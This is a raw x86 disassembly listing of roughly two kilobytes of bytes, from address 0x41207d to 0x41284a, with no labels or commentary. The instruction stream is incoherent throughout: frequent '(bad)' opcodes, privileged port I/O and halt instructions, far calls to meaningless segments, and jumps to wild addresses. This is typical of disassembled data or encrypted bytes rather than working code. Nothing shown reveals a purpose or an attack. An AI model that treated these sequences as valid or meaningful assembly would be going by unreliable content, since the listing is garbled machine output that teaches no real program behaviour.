  41207d:	fwait
  41207e:	out    0x62,al
  412080:	add    DWORD PTR [ecx+eax*8+0x65],esi
  412084:	icebp  
  412085:	mov    ah,0x30
  412087:	int    0x85
  412089:	dec    esi
  41208a:	xchg   edx,eax
  41208b:	pop    ds
  41208c:	jnp    0x4120fd
  41208e:	mov    edi,0x821d61d8
  412093:	and    DWORD PTR [edx+ebx*2],esi
  412096:	outs   dx,BYTE PTR ds:[esi]
  412097:	xchg   esp,eax
  412098:	js     0x4120e9
  41209a:	out    0x81,al
  41209c:	add    bl,dl
  41209e:	pop    DWORD PTR [edi]
  4120a0:	call   0x8d69:0xc579873d
  4120a7:	popa   
  4120a8:	pop    ss
  4120a9:	je     0x41207f
  4120ab:	pop    eax
  4120ac:	add    BYTE PTR [esi+0x2d],0x34
  4120b0:	mov    al,0x83
  4120b2:	xchg   ebp,eax
  4120b3:	xchg   edi,eax
  4120b4:	(bad)  
  4120b5:	pop    esi
  4120b6:	imul   eax,ebx,0x849af404
  4120bc:	mov    edi,0x62b4447d
  4120c1:	add    eax,0xa14b0240
  4120c6:	cdq    
  4120c7:	add    bl,BYTE PTR [esp+ebx*8+0x230cbd40]
  4120ce:	push   ecx
  4120cf:	adc    al,0xb7
  4120d1:	or     edx,DWORD PTR [eax+edx*1]
  4120d4:	(bad)  
  4120d5:	jmp    0x3da793cc
  4120da:	cmp    ebx,ebx
  4120dc:	or     BYTE PTR [ebx],ch
  4120de:	scas   al,BYTE PTR es:[edi]
  4120df:	retf   0xe4b8
  4120e2:	arpl   WORD PTR [ecx+0x76],dx
  4120e5:	test   al,0x69
  4120e7:	(bad)  
  4120e8:	fstp   TBYTE PTR [ebx-0x1a]
  4120eb:	xchg   ebp,eax
  4120ec:	ficomp WORD PTR [ebp+esi*8+0x4fc9e38e]
  4120f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f4:	clc    
  4120f5:	mov    WORD PTR [esi-0x69],?
  4120f8:	fisub  DWORD PTR [esi+0x65]
  4120fb:	mov    bl,0xbf
  4120fd:	mov    edx,0xf1744cf0
  412102:	mov    cs,ebx
  412104:	icebp  
  412105:	dec    ebp
  412106:	sbb    DWORD PTR [edx-0x46],0xfd5dcfdd
  41210d:	loope  0x41215c
  41210f:	push   esp
  412110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412111:	jle    0x41209b
  412113:	in     al,0x65
  412115:	adc    edx,DWORD PTR [eax]
  412117:	pop    ebx
  412118:	data16 adc al,0xe6
  41211b:	push   ebp
  41211c:	dec    esi
  41211d:	push   ebx
  41211e:	js     0x4120bd
  412120:	adc    cl,ah
  412122:	pop    ds
  412123:	test   al,0x3f
  412125:	ds gs das 
  412128:	pop    ss
  412129:	pop    es
  41212a:	(bad)  
  41212b:	stc    
  41212c:	push   ss
  41212d:	loop   0x41214f
  41212f:	mov    eax,0xb14d652b
  412134:	outs   dx,BYTE PTR ds:[esi]
  412135:	sub    ch,BYTE PTR [edi]
  412137:	or     al,0x9c
  412139:	xor    BYTE PTR [esi],bl
  41213b:	sub    eax,0x7295bbcb
  412140:	jmp    0xfd1487c4
  412145:	lds    ebp,FWORD PTR gs:[ecx+0x4]
  412149:	inc    ecx
  41214a:	std    
  41214b:	sti    
  41214c:	ins    BYTE PTR es:[edi],dx
  41214d:	cli    
  41214e:	retf   
  41214f:	sbb    eax,0x7788ddc9
  412154:	in     al,0xff
  412156:	mov    dh,0x27
  412158:	jne    0x412102
  41215a:	pushf  
  41215b:	je     0x412113
  41215d:	sub    BYTE PTR [ebx+0x7e],al
  412160:	enter  0x753b,0xdf
  412164:	pop    edi
  412165:	retf   0x4717
  412168:	retf   
  412169:	stos   DWORD PTR es:[edi],eax
  41216a:	mul    DWORD PTR [edx-0x51a6b745]
  412170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412171:	das    
  412172:	retf   
  412173:	fst    QWORD PTR [edx+0x68]
  412176:	lea    edx,[eax-0x52]
  412179:	addr16 cld 
  41217b:	leave  
  41217c:	icebp  
  41217d:	and    al,0xb2
  41217f:	mov    ds:0xfa9b9cf7,al
  412184:	mov    WORD PTR [ebx-0x31],cs
  412187:	mov    ds:0x110f06db,eax
  41218c:	jns    0x41216a
  41218e:	mov    ebp,0x9cae3cae
  412193:	cmc    
  412194:	xchg   edi,eax
  412195:	and    eax,0xd7488ae5
  41219a:	enter  0x1726,0xc8
  41219e:	push   0xfffffff2
  4121a0:	inc    edi
  4121a1:	(bad)  
  4121a2:	out    dx,al
  4121a3:	(bad)  
  4121a4:	pop    esp
  4121a5:	mov    ebp,0x18cf0b2b
  4121aa:	adc    edi,DWORD PTR [ecx]
  4121ac:	dec    esi
  4121ad:	cmp    BYTE PTR [ecx],bl
  4121af:	jo     0x412218
  4121b1:	inc    DWORD PTR [edi]
  4121b3:	leave  
  4121b4:	ja     0x41213d
  4121b6:	js     0x4121a1
  4121b8:	out    dx,eax
  4121b9:	into   
  4121ba:	dec    ecx
  4121bb:	mov    WORD PTR [eax-0x67d73fed],cs
  4121c1:	stos   BYTE PTR es:[edi],al
  4121c2:	ret    0x844d
  4121c5:	mov    al,ds:0x1e7c2390
  4121ca:	lods   al,BYTE PTR ds:[esi]
  4121cb:	enter  0xadac,0xd7
  4121cf:	xor    al,0x1b
  4121d1:	jnp    0x412155
  4121d3:	xchg   ebp,eax
  4121d4:	and    DWORD PTR es:[ecx+ebx*8+0x65],edi
  4121d9:	inc    ebx
  4121da:	pop    ebp
  4121db:	inc    edi
  4121dc:	or     DWORD PTR [edi-0x5e9f6202],0xfc96a68
  4121e6:	out    dx,al
  4121e7:	adc    ah,BYTE PTR [ebp-0x20]
  4121ea:	push   ss
  4121eb:	push   es
  4121ec:	es inc esp
  4121ee:	cwde   
  4121ef:	push   ecx
  4121f0:	ins    DWORD PTR es:[edi],dx
  4121f1:	mov    al,0xc5
  4121f3:	mov    ebp,0x7069e3a6
  4121f8:	pop    ecx
  4121f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fa:	push   ebx
  4121fb:	inc    eax
  4121fc:	mov    eax,DWORD PTR [ebp+edi*4-0x39302b79]
  412203:	pop    ebx
  412204:	je     0x41218a
  412206:	popa   
  412207:	hlt    
  412208:	test   esi,ebp
  41220a:	lods   al,BYTE PTR ds:[esi]
  41220b:	shl    BYTE PTR [ebx-0x25],cl
  41220e:	sub    BYTE PTR [edi+0x7c],bl
  412211:	int    0x52
  412213:	pushf  
  412214:	dec    BYTE PTR [ebx]
  412216:	es cs inc eax
  412219:	data16 lock cmc 
  41221c:	adc    DWORD PTR [esi+0x79f96b68],ebp
  412222:	mov    al,BYTE PTR [edx+0x54]
  412225:	or     DWORD PTR [ebx+0x585870f2],edx
  41222b:	call   0x32c3fcfb
  412230:	add    ah,BYTE PTR [ebp-0x57e59574]
  412236:	ret    
  412237:	jmp    0xaeba:0x5da79db8
  41223e:	adc    BYTE PTR [edi-0x43],ah
  412241:	mov    eax,ds:0x2f7f1631
  412246:	fadd   DWORD PTR [ebx-0x40]
  412249:	jmp    0x412290
  41224b:	jge    0x4122a8
  41224d:	mov    ah,0x5a
  41224f:	(bad)  
  412250:	mov    bl,0xcf
  412252:	fistp  QWORD PTR [ebx-0x10da888c]
  412258:	es call 0xc9bb393a
  41225e:	push   edi
  41225f:	mov    eax,ds:0xb6aac091
  412264:	ss jo  0x412232
  412267:	adc    eax,0x5283d87b
  41226c:	push   dx
  41226e:	int    0x50
  412270:	lahf   
  412271:	mov    bl,0x62
  412273:	rcl    ebp,cl
  412275:	pop    esi
  412276:	imul   BYTE PTR ds:0x2784ee59
  41227c:	inc    ebx
  41227d:	ret    
  41227e:	jecxz  0x412220
  412280:	fmul   DWORD PTR [edi-0x4aa20226]
  412286:	mov    edi,0x472821a4
  41228b:	mov    ds:0x34642e60,al
  412290:	cmp    al,0x20
  412292:	dec    edx
  412293:	fidivr WORD PTR [edx-0x75]
  412296:	and    al,0xa
  412298:	jge    0x41230c
  41229a:	adc    edi,DWORD PTR [edx+0x67]
  41229d:	je     0x4122e0
  41229f:	mov    edx,0x20067d4c
  4122a4:	add    al,0x2c
  4122a6:	(bad)  
  4122a7:	shr    dh,cl
  4122a9:	pop    esp
  4122aa:	or     eax,0x956f552a
  4122af:	dec    ebx
  4122b0:	test   ebp,edi
  4122b2:	data16 sti 
  4122b4:	dec    edi
  4122b5:	loope  0x412265
  4122b7:	add    al,0x7d
  4122b9:	add    al,0x6
  4122bb:	pop    eax
  4122bc:	xor    ch,bh
  4122be:	lods   al,BYTE PTR ds:[esi]
  4122bf:	ret    
  4122c0:	test   eax,0x7a428d2f
  4122c5:	jbe    0x412341
  4122c7:	pop    ebx
  4122c8:	mov    ds:0x71d83b32,eax
  4122cd:	mov    DWORD PTR [eax+edi*8+0x2ec1363d],ebp
  4122d4:	xor    al,0xdd
  4122d6:	mov    bh,0x1a
  4122d8:	lods   eax,DWORD PTR ds:[esi]
  4122d9:	pop    eax
  4122da:	in     al,0xf2
  4122dc:	test   DWORD PTR [ebp+0x2],eax
  4122df:	lea    esp,[edi-0x34]
  4122e2:	xchg   edi,eax
  4122e3:	inc    ebx
  4122e4:	pop    esp
  4122e5:	push   ebx
  4122e6:	vmread DWORD PTR [edx+0x28],esp
  4122ea:	xor    BYTE PTR [ebp+0x52d890e2],ah
  4122f0:	cwde   
  4122f1:	scas   eax,DWORD PTR es:[edi]
  4122f2:	or     al,0x41
  4122f4:	(bad)  
  4122f5:	mov    ah,0xf9
  4122f7:	sbb    DWORD PTR [edx+0x31febfcc],edx
  4122fd:	cmp    ch,BYTE PTR [edi]
  4122ff:	js     0x412299
  412301:	fst    QWORD PTR [edx+0x6f]
  412304:	push   ebx
  412305:	pop    es
  412306:	add    ecx,ecx
  412308:	dec    edi
  412309:	test   eax,0x21191d67
  41230e:	mov    DWORD PTR [ebp+0x464b55fd],eax
  412314:	jb     0x4122d5
  412316:	in     al,0x57
  412318:	jne    0x4122ee
  41231a:	sub    cl,dl
  41231c:	int    0xa6
  41231e:	aas    
  41231f:	dec    ecx
  412320:	test   BYTE PTR [esi-0x5b697328],dl
  412326:	jl     0x4122f6
  412328:	in     eax,0x78
  41232a:	clc    
  41232b:	cld    
  41232c:	fisubr WORD PTR [ebx+0x3b]
  41232f:	mov    dh,0xb3
  412331:	mov    DWORD PTR [edx-0x3d837efe],edx
  412337:	add    ecx,edx
  412339:	xor    BYTE PTR [esi-0x546db60c],al
  41233f:	int3   
  412340:	icebp  
  412341:	mov    ds:0x34211ca5,al
  412346:	aam    0xae
  412348:	test   dh,bl
  41234a:	jne    0x41238b
  41234c:	rol    al,0xbe
  41234f:	push   edi
  412350:	jb     0x412336
  412352:	or     al,0x14
  412354:	inc    ebx
  412355:	sbb    DWORD PTR [edx-0xd],edi
  412358:	std    
  412359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235a:	gs addr16 add edx,edx
  41235e:	add    al,bl
  412360:	xor    BYTE PTR [ebx],dl
  412362:	ret    
  412363:	inc    edi
  412364:	ins    BYTE PTR es:[edi],dx
  412365:	push   edi
  412366:	ret    0x77a8
  412369:	cmc    
  41236a:	add    eax,0x61b262fb
  41236f:	mov    BYTE PTR [esi+ebp*8-0x3520f69],bh
  412376:	popa   
  412377:	sub    al,0xf6
  412379:	sbb    al,0xf4
  41237b:	ds push ebp
  41237d:	cld    
  41237e:	push   esp
  41237f:	dec    esi
  412380:	xchg   esp,eax
  412381:	aaa    
  412382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412383:	xor    eax,0x65cf59d8
  412388:	fdivr  DWORD PTR [edi-0x7e]
  41238b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41238c:	and    eax,0xb751297a
  412391:	pop    eax
  412392:	icebp  
  412393:	lea    ebp,[edx+ecx*1]
  412396:	cs sahf 
  412398:	jbe    0x4123e1
  41239a:	mov    al,ds:0x3fe526d7
  41239f:	xchg   ecx,eax
  4123a0:	and    eax,edx
  4123a2:	cmp    ebx,DWORD PTR [si-0x21]
  4123a6:	jnp    0x412408
  4123a8:	add    DWORD PTR [edx+0x58263306],ebp
  4123ae:	loope  0x412353
  4123b0:	sub    BYTE PTR [eax+0x2a2a6be7],al
  4123b6:	jmp    0x566d61d4
  4123bb:	sub    BYTE PTR [esi],ah
  4123bd:	imul   edi,DWORD PTR [esi],0x56
  4123c0:	cmp    dh,cl
  4123c2:	add    al,0x4b
  4123c4:	adc    al,0x9
  4123c6:	arpl   WORD PTR [edi+0x78],di
  4123c9:	add    edx,DWORD PTR [ebx+0x55]
  4123cc:	push   0x65
  4123ce:	push   ecx
  4123cf:	(bad)  
  4123d0:	test   al,0xca
  4123d2:	xchg   DWORD PTR [edx-0x68],ecx
  4123d5:	add    ecx,edx
  4123d7:	and    BYTE PTR [eax],cl
  4123d9:	hlt    
  4123da:	mov    ecx,0x1bf786
  4123df:	add    ch,ah
  4123e1:	adc    BYTE PTR [esi+0x23d1d85b],bh
  4123e7:	stos   DWORD PTR es:[edi],eax
  4123e8:	sahf   
  4123e9:	enter  0x41c4,0xd
  4123ed:	xor    dl,0x77
  4123f0:	sub    eax,0x968c24eb
  4123f5:	pop    es
  4123f6:	mov    WORD PTR [ebp-0x6f670b75],ds
  4123fc:	mov    edi,0x2b2adb0a
  412401:	outs   dx,BYTE PTR fs:[esi]
  412403:	idiv   DWORD PTR [edi]
  412405:	call   0xc9bddcac
  41240a:	inc    esi
  41240b:	add    edi,DWORD PTR [edi]
  41240d:	xor    ah,BYTE PTR [ebp+0x43]
  412410:	aam    0x42
  412412:	or     BYTE PTR [edx+0xc9974d9],ch
  412418:	call   0x691e:0xdf1acb42
  41241f:	jmp    0x98c2ae0e
  412424:	mov    ecx,0xbcfc7be6
  412429:	retf   
  41242a:	lahf   
  41242b:	fs in  al,0xf7
  41242e:	push   0xe3395450
  412433:	out    0x8f,eax
  412435:	sub    DWORD PTR [eax+0xb0ad9d9],0xffffffd7
  41243c:	pop    ds
  41243d:	lahf   
  41243e:	gs mov ebx,0xf37a07e9
  412444:	mov    esi,0x1ed1868
  412449:	pop    ebp
  41244a:	mov    edi,0x42fc3ed0
  41244f:	(bad)  
  412451:	rcr    cl,1
  412453:	loop   0x412498
  412455:	mov    BYTE PTR [esi+0x6e],dl
  412458:	inc    esp
  412459:	les    edi,FWORD PTR [ecx+0x4c]
  41245c:	cmp    eax,ebp
  41245e:	add    BYTE PTR [esi+0x7fd9a37c],dh
  412464:	dec    edi
  412465:	loope  0x4124be
  412467:	data16 data16 cmc 
  41246a:	inc    ecx
  41246b:	cmp    dh,ch
  41246d:	mov    eax,0xc60fe9fc
  412472:	int    0x9c
  412474:	(bad)  
  412475:	sbb    edi,DWORD PTR [edi+0x36]
  412478:	jbe    0x4124cc
  41247a:	push   edi
  41247b:	cmp    ebx,DWORD PTR [edi-0x348946b0]
  412481:	push   0xffffffc7
  412483:	pop    ss
  412484:	and    DWORD PTR [ecx],ebp
  412486:	dec    edx
  412487:	lods   al,BYTE PTR ds:[esi]
  412488:	ins    DWORD PTR es:[edi],dx
  412489:	xlat   BYTE PTR ds:[ebx]
  41248a:	std    
  41248b:	xor    cl,dh
  41248d:	and    DWORD PTR [eax+0x54],edi
  412490:	repz xlat BYTE PTR ds:[ebx]
  412492:	cmp    DWORD PTR [ecx-0x6f],0x66753914
  412499:	pop    ss
  41249a:	mov    ah,0x6
  41249c:	cmp    DWORD PTR [ebp+0x88509f7],eax
  4124a2:	les    edi,FWORD PTR [ebx]
  4124a4:	pop    esp
  4124a5:	xor    dh,ah
  4124a7:	out    0xa7,eax
  4124a9:	outs   dx,BYTE PTR ds:[esi]
  4124aa:	mov    BYTE PTR [esi],ah
  4124ac:	call   0xaf4:0xe8f6119e
  4124b3:	ins    BYTE PTR es:[edi],dx
  4124b4:	or     ch,ah
  4124b6:	xor    al,0x7c
  4124b8:	sbb    bh,cl
  4124ba:	hlt    
  4124bb:	adc    ch,BYTE PTR [ebp-0x2f]
  4124be:	inc    ebx
  4124bf:	cmp    ebp,ebp
  4124c1:	pop    eax
  4124c2:	or     cl,BYTE PTR [edi+0x4a]
  4124c5:	xor    bl,BYTE PTR [ebx]
  4124c7:	out    dx,al
  4124c8:	imul   ecx,DWORD PTR [esi+0x57],0x68b6bc59
  4124cf:	jecxz  0x4124d6
  4124d1:	jae    0x412527
  4124d3:	dec    eax
  4124d4:	(bad)  
  4124d6:	std    
  4124d7:	add    eax,0x844d00a2
  4124dc:	xlat   BYTE PTR ds:[ebx]
  4124dd:	push   ebp
  4124de:	lahf   
  4124df:	cdq    
  4124e0:	fwait
  4124e1:	test   eax,edi
  4124e3:	shl    BYTE PTR [ecx],0x24
  4124e6:	daa    
  4124e7:	or     BYTE PTR [edx-0x5d],cl
  4124ea:	mov    ebx,0x8496bbb3
  4124ef:	pop    esi
  4124f0:	jmp    0x4124a9
  4124f2:	or     eax,0xb22b3ef1
  4124f7:	and    ebx,eax
  4124f9:	adc    eax,0x4d810c61
  4124fe:	retf   
  4124ff:	(bad)  
  412500:	bound  esi,QWORD PTR ds:0x98eeefcb
  412506:	mov    ds:0x5886d648,al
  41250b:	scas   eax,DWORD PTR es:[edi]
  41250c:	and    edx,ebp
  41250e:	outs   dx,DWORD PTR ds:[esi]
  41250f:	ja     0x4124fd
  412511:	push   ss
  412512:	adc    BYTE PTR [edx+ebp*2-0x80],al
  412516:	xor    al,0xe
  412518:	pop    ss
  412519:	sub    edi,0xb987ac3e
  41251f:	ret    
  412520:	lods   eax,DWORD PTR ds:[esi]
  412521:	mov    dl,0x4e
  412523:	mov    ch,0x6a
  412525:	mov    ebx,0x388cdd59
  41252a:	rol    DWORD PTR [eax-0x8],0x80
  41252e:	mov    ah,0xeb
  412530:	sub    eax,0x8c11401a
  412535:	jne    0x412568
  412537:	or     cl,al
  412539:	ret    
  41253a:	repz mov ds:0xa739b395,al
  412540:	pop    ebp
  412541:	test   BYTE PTR [ecx],al
  412543:	mov    esi,ebx
  412545:	adc    dh,BYTE PTR [ebx]
  412547:	mov    DWORD PTR [ecx],ebp
  412549:	push   esi
  41254a:	(bad)  
  41254b:	mov    ebx,0x7432e1c5
  412550:	pop    ecx
  412551:	jg     0x4124d8
  412553:	fwait
  412554:	inc    ecx
  412555:	sbb    al,0xf1
  412557:	pop    es
  412558:	int    0xd0
  41255a:	pop    ss
  41255b:	idiv   dl
  41255d:	leave  
  41255e:	aam    0x77
  412560:	or     al,0x65
  412562:	sbb    al,cl
  412564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412565:	cmp    eax,0xea804e7e
  41256a:	mov    dh,0x74
  41256c:	rcr    DWORD PTR [ecx],0xa6
  41256f:	adc    eax,0xf7d5ce67
  412574:	push   edi
  412575:	sub    eax,0x349d2c20
  41257a:	xchg   DWORD PTR [ebx+0x42],ecx
  41257d:	mov    ebp,0xb3131ff3
  412582:	rol    DWORD PTR [edx],cl
  412584:	ins    DWORD PTR es:[edi],dx
  412585:	pop    esp
  412587:	cmp    cl,al
  412589:	ss call 0xf798de2c
  41258f:	dec    edx
  412590:	(bad)  
  412591:	clc    
  412592:	mov    ds:0x7daec361,eax
  412597:	xchg   esp,eax
  412598:	xchg   edx,eax
  412599:	push   0xffffff89
  41259b:	and    dh,BYTE PTR [edx-0x63fcad5a]
  4125a1:	mov    al,ds:0xd32a0aca
  4125a6:	add    DWORD PTR ds:[ecx-0x11],eax
  4125aa:	push   esi
  4125ab:	sbb    ebx,DWORD PTR [esi+0x189a06c]
  4125b1:	sbb    al,0x86
  4125b3:	xor    eax,0xac4924ba
  4125b8:	sbb    esi,edi
  4125ba:	sub    al,0xf8
  4125bc:	stc    
  4125bd:	or     eax,0x4b38ad22
  4125c2:	ret    0xf4d6
  4125c5:	sysenter 
  4125c7:	adc    bl,al
  4125c9:	jne    0x412602
  4125cb:	sbb    DWORD PTR [ebx+0x207e7aec],0x4d504191
  4125d5:	sbb    eax,0xcddc13be
  4125da:	mov    edx,0x997615d5
  4125df:	xchg   ebp,eax
  4125e0:	shl    BYTE PTR [eax+0x31],cl
  4125e3:	push   es
  4125e4:	aaa    
  4125e5:	sub    DWORD PTR [edx],eax
  4125e7:	sahf   
  4125e8:	repz inc edx
  4125ea:	push   esi
  4125eb:	ficom  DWORD PTR [esp+ebx*4-0x30]
  4125ef:	xchg   esp,eax
  4125f0:	dec    edi
  4125f1:	add    al,0x77
  4125f3:	in     eax,dx
  4125f4:	lods   al,BYTE PTR ds:[esi]
  4125f5:	fmulp  st(6),st
  4125f7:	ficomp DWORD PTR [ebx+0x30]
  4125fa:	call   0x5a54:0x85fd1300
  412601:	jne    0x412606
  412603:	cmp    ecx,eax
  412605:	jl     0x41259c
  412607:	int3   
  412608:	adc    dl,bh
  41260a:	and    al,0x44
  41260c:	push   esi
  41260d:	aaa    
  41260e:	div    DWORD PTR [edx]
  412610:	outs   dx,DWORD PTR ds:[esi]
  412611:	and    edx,DWORD PTR [edx-0x69]
  412614:	dec    esi
  412615:	loop   0x412639
  412617:	ins    BYTE PTR es:[edi],dx
  412618:	and    BYTE PTR [edx+0x6dc41f2d],0x22
  41261f:	lods   eax,DWORD PTR ds:[esi]
  412620:	cmp    DWORD PTR [edi],ecx
  412622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412623:	push   0x7e3e7b56
  412628:	mov    edi,0x8ad4eb89
  41262d:	lds    edi,FWORD PTR [ebx+edi*1-0x29]
  412631:	push   cs
  412632:	gs push es
  412634:	jne    0x41268e
  412636:	sbb    eax,0xb4931b00
  41263b:	inc    eax
  41263c:	ret    
  41263d:	cmp    BYTE PTR [edi+0x74],bl
  412640:	fucomip st,st(4)
  412642:	les    edx,FWORD PTR [edi-0x52]
  412645:	mov    ebp,0x55935d39
  41264a:	mov    BYTE PTR [edx],ah
  41264c:	mov    ch,0x4d
  41264e:	fsubrp st(2),st
  412650:	pop    ss
  412651:	iret   
  412652:	sub    bl,BYTE PTR [edi]
  412654:	lods   eax,DWORD PTR ds:[esi]
  412655:	jg     0x412634
  412657:	fistp  WORD PTR [edi-0x34ef62d7]
  41265d:	cmp    cl,BYTE PTR [eax+ebx*2-0x534fbabe]
  412664:	or     al,0x26
  412666:	xchg   esi,eax
  412667:	(bad)  
  412668:	hlt    
  412669:	jb     0x412665
  41266b:	adc    DWORD PTR [ecx-0x32],0xffffffa3
  41266f:	repz arpl cx,di
  412672:	and    eax,0xe7c8c5ab
  412677:	addr16 mov dh,0xa3
  41267a:	daa    
  41267b:	adc    DWORD PTR [ebp+0x45],ebp
  41267e:	repnz clc 
  412680:	sbb    dh,bh
  412682:	jl     0x41266e
  412684:	pushf  
  412685:	xlat   BYTE PTR ds:[ebx]
  412686:	loop   0x4126f5
  412688:	mov    bh,0x54
  41268a:	mov    al,ds:0x4b9b47f7
  41268f:	call   0xa6b07725
  412694:	mov    bl,0x87
  412696:	pop    es
  412697:	rcr    ecx,cl
  412699:	fadd   DWORD PTR [edx+esi*4-0x3f00f5b]
  4126a0:	sar    BYTE PTR [ebp+0x534a1f8c],cl
  4126a6:	mov    dl,0x52
  4126a8:	cmp    eax,0x136e6ac
  4126ad:	mov    ah,BYTE PTR [eax+0x4638d70f]
  4126b3:	dec    ebp
  4126b5:	or     dl,BYTE PTR [edx+0x6c691f04]
  4126bb:	test   BYTE PTR [edx+0x5a],dh
  4126be:	mov    cl,0xd4
  4126c0:	rol    DWORD PTR [ecx-0x4112fcc6],cl
  4126c6:	sbb    ecx,DWORD PTR [eax+edi*8-0x52e443b3]
  4126cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ce:	sbb    DWORD PTR [edx+0x744c518c],eax
  4126d4:	out    dx,al
  4126d5:	push   edi
  4126d6:	nop
  4126d7:	test   al,0x25
  4126d9:	loope  0x41267a
  4126db:	loopne 0x4126c4
  4126dd:	ret    0x43ea
  4126e0:	dec    ebp
  4126e1:	(bad)  
  4126e2:	pop    eax
  4126e3:	add    esp,ebp
  4126e5:	push   ecx
  4126e6:	scas   eax,DWORD PTR es:[edi]
  4126e7:	sbb    BYTE PTR [ecx-0x4b6c9bd5],dh
  4126ed:	inc    ebx
  4126ee:	jns    0x4126b3
  4126f0:	test   al,0x89
  4126f2:	and    al,0x60
  4126f4:	bound  eax,QWORD PTR [ebx-0x3a]
  4126f7:	adc    ecx,DWORD PTR [ecx+ebp*8-0x7c]
  4126fb:	mov    edx,0x7955a4f1
  412700:	mov    BYTE PTR [esp+edx*1-0x54],ah
  412704:	mov    eax,0xb117c955
  412709:	xchg   edx,eax
  41270a:	cli    
  41270b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41270c:	ins    BYTE PTR es:[edi],dx
  41270d:	fsub   QWORD PTR [ecx]
  41270f:	les    esi,FWORD PTR ds:0x3b50f4cf
  412715:	arpl   sp,cx
  412717:	adc    esp,DWORD PTR [eax-0x1a]
  41271a:	inc    edi
  41271b:	mov    BYTE PTR [edx],al
  41271d:	outs   dx,DWORD PTR ds:[esi]
  41271e:	gs (bad) 
  412720:	cdq    
  412721:	repnz and ebp,esi
  412724:	push   ecx
  412725:	out    dx,eax
  412726:	lods   al,BYTE PTR ds:[esi]
  412727:	mov    ebx,0x17c9e3a8
  41272c:	xchg   ecx,eax
  41272d:	repnz clc 
  41272f:	push   ebp
  412730:	fnstenv ds:0x4af571a5
  412736:	(bad)  
  412737:	pushf  
  412738:	jae    0x4126e8
  41273a:	jge    0x412725
  41273c:	jl     0x4126da
  41273e:	scas   eax,DWORD PTR es:[edi]
  41273f:	mov    fs,WORD PTR [edx]
  412741:	pop    ss
  412742:	bound  eax,QWORD PTR [ebp+eiz*2-0x31]
  412746:	fisubr DWORD PTR [ebx]
  412748:	and    DWORD PTR [esi+edi*8],ebx
  41274b:	fcomp  DWORD PTR [ecx]
  41274d:	into   
  41274e:	addr16 (bad) 
  412750:	xor    eax,0xe1fa4072
  412755:	xor    eax,0x62706ed3
  41275a:	pop    ecx
  41275b:	mov    ch,cl
  41275d:	fidivr WORD PTR [ebp+0x6d3a67e1]
  412763:	je     0x41275f
  412765:	nop
  412766:	mov    esp,0xd1aa9e4b
  41276b:	xchg   edi,eax
  41276c:	pop    esi
  41276d:	retf   0xbd0
  412770:	(bad)  
  412772:	cli    
  412773:	jns    0x41274e
  412775:	sub    cl,BYTE PTR [ebx+0x2ec8f104]
  41277b:	add    eax,0x84e3f583
  412780:	and    BYTE PTR [edi],0xd5
  412783:	sbb    ecx,esp
  412785:	lahf   
  412786:	mov    al,ds:0xfb868f8f
  41278b:	inc    BYTE PTR [eax+0x6988d2c3]
  412791:	xchg   edi,eax
  412792:	mov    ah,0x7f
  412794:	jecxz  0x4127d0
  412796:	pop    edx
  412797:	outs   dx,BYTE PTR ds:[esi]
  412799:	push   edx
  41279a:	inc    esi
  41279b:	push   ss
  41279c:	adc    dl,al
  41279e:	mov    DWORD PTR [eax-0x68],edi
  4127a1:	rol    ah,1
  4127a3:	sti    
  4127a4:	outs   dx,DWORD PTR ds:[esi]
  4127a5:	jo     0x4127d2
  4127a7:	cmp    al,dh
  4127a9:	dec    ebp
  4127aa:	stc    
  4127ab:	xchg   ebp,eax
  4127ac:	xchg   edi,eax
  4127ad:	sub    al,0x6a
  4127af:	xor    edx,esp
  4127b1:	cmc    
  4127b2:	inc    edi
  4127b3:	bsf    esi,DWORD PTR [edx-0x6c]
  4127b7:	add    al,BYTE PTR [edx+0x1403b833]
  4127bd:	or     eax,0x61773d0e
  4127c2:	cmp    esp,DWORD PTR [eax+0x5e]
  4127c5:	lahf   
  4127c6:	push   cs
  4127c7:	mov    WORD PTR [ecx+0x38239483],ds
  4127cd:	push   es
  4127ce:	jno    0x4127a2
  4127d0:	ret    
  4127d1:	cs (bad) 
  4127d4:	xchg   DWORD PTR [eax+0x6c],ebx
  4127d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127d8:	jle    0x412823
  4127da:	dec    ecx
  4127db:	xor    eax,0x4d8ebb8
  4127e0:	xchg   esi,edi
  4127e2:	(bad)  
  4127e3:	pop    edx
  4127e4:	jo     0x412811
  4127e6:	sbb    edi,DWORD PTR [ecx+0x7c08116c]
  4127ec:	fstp   DWORD PTR [edx+0x59]
  4127ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f0:	or     dh,BYTE PTR [edi]
  4127f2:	pop    ecx
  4127f3:	les    ebp,FWORD PTR [ecx+0x2a]
  4127f6:	int    0x9a
  4127f8:	lds    edx,FWORD PTR ds:[ecx]
  4127fb:	cmp    eax,0x88a16be5
  412800:	cmp    DWORD PTR [edi],ebx
  412802:	push   ebp
  412803:	push   ss
  412804:	sbb    al,0xcd
  412806:	adc    al,0x60
  412808:	xor    al,0x2
  41280a:	imul   edx,DWORD PTR [ecx],0x6d
  41280d:	xor    eax,DWORD PTR [edi-0x68]
  412810:	and    dh,BYTE PTR [ebp-0x7d571e7c]
  412816:	ds push cs
  412818:	adc    edi,DWORD PTR [ebp-0x142beb3b]
  41281e:	mov    esp,0x341ca19e
  412823:	pop    ss
  412824:	mov    edx,0x95ffefea
  412829:	rol    BYTE PTR [ebp+0x6],1
  41282c:	call   0x3d85c026
  412831:	adc    dl,ah
  412833:	mov    ds:0xf448e7ab,eax
  412838:	es mov dh,0x39
  41283b:	pop    es
  41283c:	mov    ds:0xd66cad0d,al
  412841:	cmp    eax,DWORD PTR [esi]
  412843:	sahf   
  412844:	lea    edi,[esi+0xa]
  412847:	stos   BYTE PTR es:[edi],al
  412848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412849:	push   ss
  41284a:	ret    
